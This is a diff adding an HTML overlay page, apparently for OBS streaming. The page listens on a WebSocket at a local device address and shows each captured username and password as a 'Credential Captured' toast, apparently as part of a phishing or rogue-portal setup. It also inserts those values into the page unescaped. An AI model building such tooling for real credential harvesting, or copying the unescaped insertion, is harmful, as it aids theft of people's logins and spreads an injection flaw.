@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OBS Credential Toast</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+      background-color: rgba(0, 0, 0, 0);
+      margin: 0;
+      padding: 0;
+    }
+
+    .toast-container {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      width: 300px;
+      max-width: 90%;
+      z-index: 1000;
+      display: flex;
+      flex-direction: column-reverse;
+    }
+
+    .toast {
+      background-color: rgba(44, 44, 44, 0.9);
+      color: white;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      margin-bottom: 10px;
+      opacity: 0;
+      transform: translateX(100%);
+      animation: slideIn 0.5s forwards, fadeOut 0.5s forwards 4s;
+      transition: opacity 0.5s, transform 0.5s;
+      position: relative;
+      word-wrap: break-word;
+      border-left: 5px solid #ff4d4d;
+    }
+
+    .toast-title {
+      font-weight: bold;
+      margin-bottom: 5px;
+      font-size: 1.1em;
+    }
+
+    .toast-content {
+      font-size: 0.9em;
+    }
+
+    @keyframes slideIn {
+      from {
+        transform: translateX(100%);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateX(0);
+        opacity: 1;
+      }
+    }
+
+    @keyframes fadeOut {
+      from {
+        opacity: 1;
+        transform: translateX(0);
+      }
+
+      to {
+        opacity: 0;
+        transform: translateX(100%);
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="toast-container" id="toastContainer"></div>
+  <script>
+    const socket = new WebSocket('ws://192.168.4.1/ws');
+    const toastContainer = document.getElementById('toastContainer');
+    socket.onopen = function (event) { console.log('Conexión WebSocket abierta.'); };
+    socket.onmessage = function (event) {
+      try {
+        const data = JSON.parse(event.data);
+        if (data.user && data.pass) { createToast(data.user, data.pass); }
+      } catch (e) { console.error('Error al parsear JSON:', e); }
+    };
+    socket.onclose = function (event) {
+      console.log('Conexión WebSocket cerrada:', event.code, event.reason);
+    };
+    socket.onerror = function (error) { console.error('Error WebSocket:', error); };
+
+    function createToast(user, pass) {
+      const toast = document.createElement('div');
+      toast.className = 'toast';
+      toast.innerHTML = `
+                <div class="toast-title">¡Credencial Capturada!</div>
+                <div class="toast-content">
+                    <strong>Usuario:</strong> ${user}<br>
+                    <strong>Contraseña:</strong> ${pass}
+                </div>
+            `;
+      toastContainer.prepend(toast);
+      toast.addEventListener('animationend', (e) => {
+        if (e.animationName === 'fadeOut') { toast.remove(); }
+      });
+    }
+  </script>
+</body>
+
+</html>
